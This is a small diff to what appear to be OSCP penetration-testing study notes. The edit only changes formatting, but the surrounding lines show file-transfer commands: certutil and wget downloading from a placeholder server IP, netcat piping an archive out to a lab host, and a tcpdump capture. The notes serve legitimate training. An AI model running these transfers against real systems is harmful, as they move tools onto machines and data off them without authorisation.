@@ -71,7 +71,6 @@ certutil.exe -urlcache -f http://<SERVER_IP>/file.txt file.txt
 
 wget http://<SERVER_IP>/file.txt
 
-​
 
 #FTP
 
@@ -95,10 +94,9 @@ nc 10.10.14.2 4242 < file.tgz
 
 nc -lvnp 4242 > file.tgz
 
- 
+```
 
-### Sniffing[](https://hack.xero-sec.com/apuntes-y-recursos-oscp/tecnicas-fundamentales#sniffing)
-
+```python
 tcpdump -i tun0 icmp -n
  
 
